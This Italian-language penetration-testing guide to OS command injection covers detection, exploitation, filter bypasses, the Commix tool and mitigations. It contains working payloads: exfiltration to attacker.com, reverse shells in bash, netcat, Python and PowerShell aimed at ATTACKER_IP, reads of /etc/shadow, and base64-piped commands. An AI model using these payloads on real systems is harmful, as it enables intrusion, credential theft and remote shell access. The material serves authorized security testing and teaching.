# Command Injection

## Scopo

Questa guida copre le vulnerabilità Command Injection (OS Command Injection), tecniche di exploitation e metodologie per identificarle durante penetration test.

## Prerequisiti

- Conoscenza shell Linux/Windows
- Burp Suite
- Commix o tool simili
- **Autorizzazione per testing**

## Installazione

```bash
# Commix
git clone https://github.com/commixproject/commix.git
cd commix
python commix.py --help
```

---

## Concetto

```
L'applicazione esegue comandi OS con input utente
senza adeguata validazione

Vulnerabile:
system("ping " + user_input)

Input: 127.0.0.1; cat /etc/passwd
Eseguito: ping 127.0.0.1; cat /etc/passwd
```

---

## Operatori di Concatenazione

### Linux

| Operatore | Descrizione | Esempio |
|-----------|-------------|---------|
| `;` | Sequenziale | `cmd1; cmd2` |
| `&&` | AND (se cmd1 ok) | `cmd1 && cmd2` |
| `\|\|` | OR (se cmd1 fail) | `cmd1 \|\| cmd2` |
| `\|` | Pipe | `cmd1 \| cmd2` |
| `$()` | Command substitution | `$(cmd)` |
| `` ` `` | Backticks | `` `cmd` `` |
| `\n` | Newline | `cmd1%0acmd2` |

### Windows

| Operatore | Descrizione | Esempio |
|-----------|-------------|---------|
| `&` | Sequenziale | `cmd1 & cmd2` |
| `&&` | AND | `cmd1 && cmd2` |
| `\|\|` | OR | `cmd1 \|\| cmd2` |
| `\|` | Pipe | `cmd1 \| cmd2` |

---

## Detection

### Payloads Base

```bash
# Linux
; id
| id
|| id
&& id
$(id)
`id`
; sleep 5
| sleep 5

# Windows
& whoami
| whoami
&& whoami
|| whoami
& timeout 5
```

### Time-Based Detection

```bash
# Linux
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Windows
& ping -n 5 127.0.0.1
& timeout /t 5
```

### DNS/HTTP Exfiltration

```bash
# DNS
; nslookup $(whoami).attacker.com
; dig `hostname`.attacker.com

# HTTP
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

---

## Exploitation

### Enumeration

```bash
# Utente
; id
; whoami

# Sistema
; uname -a
; cat /etc/issue

# Rete
; ifconfig
; ip addr
; cat /etc/hosts

# File sensibili
; cat /etc/passwd
; cat /etc/shadow
```

### Reverse Shell

```bash
# Bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Netcat
; nc -e /bin/sh ATTACKER_IP 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Python
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Windows

```cmd
& net user
& systeminfo
& ipconfig /all
& type C:\Windows\System32\drivers\etc\hosts

# PowerShell reverse shell
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"
```

---

## Bypass Filtri

### Spazi

```bash
# $IFS
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Tab
cat /etc/passwd

# Brace expansion
{cat,/etc/passwd}
```

### Blacklist Parole

```bash
# Concatenazione
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Wildcard
/???/c?t /etc/passwd
/???/c* /???/p*

# Variable
a=c;b=at;$a$b /etc/passwd

# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

### Quote/Escape

```bash
# Backslash
c\at /etc/passwd

# Single quotes
'c'at /etc/passwd

# Double quotes
"c"at /etc/passwd
```

### Newline

```bash
# URL encoded
%0aid
%0acat%20/etc/passwd

# Literal
command
id
```

---

## Commix

### Scansione Base

```bash
# GET
python commix.py -u "http://target/page.php?cmd=test"

# POST
python commix.py -u "http://target/page.php" --data="cmd=test"

# Cookie
python commix.py -u "http://target/page.php" --cookie="session=abc"
```

### Opzioni Avanzate

```bash
# Tecnica specifica
python commix.py -u "URL" --technique=T  # Time-based
python commix.py -u "URL" --technique=F  # File-based

# Shell interattiva
python commix.py -u "URL" --os-cmd="id"

# Pseudo shell
python commix.py -u "URL" --os-shell
```

---

## Contesti Specifici

### PHP

```php
// Vulnerabile
system($_GET['cmd']);
exec($_POST['command']);
shell_exec($input);
passthru($data);
`$command`
```

### Python

```python
# Vulnerabile
os.system(user_input)
subprocess.call(user_input, shell=True)
os.popen(user_input)
```

### Node.js

```javascript
// Vulnerabile
const { exec } = require('child_process');
exec(userInput);
```

---

## Blind Command Injection

### Time-Based

```bash
# Verifica
; sleep 10

# Condizionale
; if [ $(whoami) = "root" ]; then sleep 5; fi
```

### Out-of-Band

```bash
# DNS
; nslookup `whoami`.attacker.com
; host $(hostname).attacker.com

# HTTP
; curl http://attacker.com/?data=$(id | base64)
```

---

## Mitigazioni

### Input Validation

```python
# Whitelist
import re
if not re.match(r'^[a-zA-Z0-9]+$', user_input):
    raise ValueError("Invalid input")
```

### Parametrizzazione

```python
# Sicuro - subprocess senza shell
import subprocess
subprocess.run(['ping', '-c', '1', user_input])

# Insicuro
os.system(f"ping -c 1 {user_input}")
```

### Altre Protezioni

```
- Evita funzioni shell se possibile
- Least privilege
- Containerizzazione
- Sandboxing
- WAF rules
```

---

## Best Practices

- **Non-destructive**: Evita comandi distruttivi
- **Minimal footprint**: Limita data exfiltration
- **Documentation**: Log tutti i payload testati
- **Remediation**: Suggerisci fix specifici
- **Scope**: Solo endpoint autorizzati

## Riferimenti

- [Commix Tool](https://github.com/commixproject/commix)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
